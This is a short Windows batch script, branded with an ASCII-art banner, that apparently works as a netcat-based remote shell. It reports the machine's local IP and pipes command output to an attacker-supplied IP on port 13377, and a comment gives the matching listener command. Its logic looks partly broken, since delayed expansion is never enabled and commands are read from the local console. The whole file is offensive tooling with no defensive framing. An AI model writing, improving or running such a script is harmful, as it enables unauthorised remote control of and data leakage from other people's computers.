@echo off

set "we=^
  _____            _      _____          _      ^
 ^|  __ \          ^| ^|    / ____^|        ^| ^|     ^
 ^| ^|__) ^|___  __ _| ^|___^| ^|     ___   __^| ^| ___ ^
 ^|  _  // _ \\/ _` ^| |_  / ^|    / _ \\/ _` |/ _ \ ^
 ^| ^| \ \  __/ (_| ^| ^|/ /^| ^|___^| (_) | (_| |  __/ ^
 ^|_|  \\_\\___|\\__,_|_/___|\\_____^|\\___/ \\__,_|\\___| ^

set "po=13377" REM nc -l -p 13377

if "%~1"=="" (
    echo Please provide the IP address as a command-line argument.
    exit /b 1
)

set "ip=%~1"
for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4 Address"') do set "client_ip=%%I"
set "we=!we!Client IP: %client_ip%"

echo %ip%:%po%

(
    echo !we!

    for /f "tokens=*" %%A in ('type con') do (
        set "cmd=%%A"

        if "!cmd!"=="exit" (
            exit /b
        )

        for /f "delims=" %%B in ('!cmd!') do (
            echo %%B
        )
    )
) | nc %ip% %po%
